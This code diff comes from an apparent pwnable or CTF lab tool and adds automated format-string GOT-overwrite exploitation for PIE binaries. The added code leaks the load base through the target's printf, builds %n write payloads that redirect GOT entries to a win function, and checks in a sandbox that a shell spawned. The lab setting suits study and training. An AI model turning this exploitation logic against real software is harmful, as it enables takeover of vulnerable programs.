@@ -27,6 +27,7 @@ from __future__ import annotations
 import secrets
 from pathlib import Path
 
+from pwnable_lab.analyzer.checksec import run_checksec
 from pwnable_lab.analyzer.strategy import (
     got_overwrite_targets,
     is_pie,
@@ -34,7 +35,13 @@ from pwnable_lab.analyzer.strategy import (
 )
 from pwnable_lab.elf.parser import parse_elf
 from pwnable_lab.payload.pack import build_fmtstr_write
-from pwnable_lab.sandbox.runner import SandboxLimits, run_with_input, verify_shell
+from pwnable_lab.sandbox.fmtleak import _calibrate_leak, _first_hex
+from pwnable_lab.sandbox.runner import (
+    SandboxLimits,
+    run_two_stage_shell,
+    run_with_input,
+    verify_shell,
+)
 
 # probe 할 포맷스트링 인자 위치(첫 몇 개는 레지스터/프레임 잡값이라 6부터).
 _PROBE_START = 6
@@ -59,6 +66,9 @@ def auto_fmt_got_overwrite(
         return {"attempted": False, "reason": "amd64-only"}
     if is_pie(image):
         return {"attempted": False, "reason": "pie-needs-base-leak"}
+    if run_checksec(image).relro == "Full":
+        # Full RELRO 는 GOT 를 읽기 전용으로 만들어 %n 쓰기가 SIGSEGV 로 실패한다.
+        return {"attempted": False, "reason": "full-relro-got-readonly"}
 
     win = ret2win_target(image)
     if win is None:
@@ -183,4 +193,144 @@ def _report(
     return report
 
 
-__all__ = ["auto_fmt_got_overwrite"]
+def auto_fmt_got_overwrite_pie(
+    binary_path: str, *, limits: SandboxLimits | None = None
+) -> dict:
+    """PIE amd64 바이너리에서 포맷스트링 GOT 덮어쓰기로 셸을 자동 증명한다.
+
+    non-PIE 판과 달리 GOT·win 주소가 base 상대라 절대주소 전제가 안 된다. 대상이
+    **스스로 흘리는 포맷스트링**으로 로드 base 를 런타임 복원한 뒤(진짜 in-band
+    leak — ASLR 켜져 있어도 성립), ``{base+got_off: base+win_off}`` 를 ``%n`` 으로
+    쓴다. 포맷스트링 취약점이 **루프 안**에 있어야 leak·write 두 번의 printf 를 쓸
+    수 있다. write payload 를 처리한 printf **직후 같은 반복에서 호출되는** 임포트
+    함수(예: 루프의 ``fflush``)의 GOT 를 덮어야 셸이 뜬다 — 후보를 모두 시도한다.
+    """
+
+    image = parse_elf(Path(binary_path).read_bytes())
+    if (image.bits or 64) != 64:
+        return {"attempted": False, "reason": "amd64-only"}
+    if not is_pie(image):
+        return {"attempted": False, "reason": "not-pie"}
+    if run_checksec(image).relro == "Full":
+        # Full RELRO 는 GOT 를 읽기 전용으로 만들어 %n 쓰기가 SIGSEGV 로 실패한다.
+        return {"attempted": False, "reason": "full-relro-got-readonly"}
+
+    win = ret2win_target(image)
+    if win is None:
+        return {"attempted": False, "reason": "no-redirect-target"}
+    targets = got_overwrite_targets(image)
+    if not targets:
+        return {"attempted": False, "reason": "no-got-target"}
+
+    limits = limits or SandboxLimits()
+
+    # write payload 를 놓을 fmt 인자 위치(우리 버퍼 첫 qword)를 확정한다.
+    write_position = _find_fmt_position(binary_path, limits)
+    if write_position is None:
+        return {"attempted": False, "reason": "no-fmt-primitive"}
+
+    # base 유출 위치·정적 오프셋 O 를 캘리브레이션(ASLR-off 오라클로 식별만; 익스
+    # 시 base 는 유출값에서 계산 → ASLR 켜져도 성립).
+    calib = _calibrate_leak(binary_path, image, limits)
+    if calib is None:
+        return {"attempted": False, "reason": "no-fmt-leak"}
+    leak_position, leak_offset = calib
+
+    win_name, win_off = win
+    prelude = f"%{leak_position}$p".encode()
+    last_proof: dict | None = None
+    for symbol, got_off in targets:
+
+        def make_second(
+            line: bytes,
+            got_off: int = got_off,
+        ) -> bytes:
+            leaked = _first_hex(line)
+            if leaked is None:
+                return _PROBE_MARKER  # leak 실패 시 아무 입력(트리거만)
+            base = leaked - leak_offset
+            return build_fmtstr_write(write_position, {base + got_off: base + win_off})
+
+        command, marker = _shell_arith_probe()
+        proof, leaked_line = run_two_stage_shell(
+            binary_path,
+            make_second,
+            marker=marker,
+            prelude=prelude,
+            command=command,
+            limits=limits,
+            disable_aslr=True,
+        )
+        last_proof = proof.as_dict()
+        if proof.shell_spawned:
+            leaked = _first_hex(leaked_line)
+            base = None if leaked is None else leaked - leak_offset
+            return _report_pie(
+                write_position,
+                leak_position,
+                leak_offset,
+                symbol,
+                got_off,
+                win_name,
+                win_off,
+                base,
+                True,
+                "shell-proven",
+                last_proof,
+            )
+
+    return _report_pie(
+        write_position,
+        leak_position,
+        leak_offset,
+        None,
+        None,
+        win_name,
+        win_off,
+        None,
+        False,
+        "did-not-spawn-shell",
+        last_proof,
+    )
+
+
+def _report_pie(
+    write_position: int,
+    leak_position: int,
+    leak_offset: int,
+    symbol: str | None,
+    got_off: int | None,
+    win_name: str,
+    win_off: int,
+    base: int | None,
+    succeeded: bool,
+    reason: str,
+    shell_proof: dict | None,
+) -> dict:
+    report: dict = {
+        "attempted": True,
+        "technique": "fmt-got-overwrite-pie",
+        "fmt_position": write_position,
+        "leak_position": leak_position,
+        "leak_offset_hex": f"0x{leak_offset:x}",
+        "base_hex": None if base is None else f"0x{base:x}",
+        "target_name": win_name,
+        "target_offset_hex": f"0x{win_off:x}",
+        "got_symbol": symbol,
+        "got_offset_hex": None if got_off is None else f"0x{got_off:x}",
+        "shell_proven": reason == "shell-proven",
+        "succeeded": succeeded,
+        "reason": reason,
+        # base 를 유출값에서 계산하므로 ASLR 이 켜져 있어도 성립하는 진짜 leak 이다.
+        "aslr": "defeated-via-inband-leak",
+    }
+    if base is not None:
+        if got_off is not None:
+            report["got_runtime_hex"] = f"0x{base + got_off:x}"
+        report["target_runtime_hex"] = f"0x{base + win_off:x}"
+    if shell_proof is not None:
+        report["shell_proof"] = shell_proof
+    return report
+
+
+__all__ = ["auto_fmt_got_overwrite", "auto_fmt_got_overwrite_pie"]
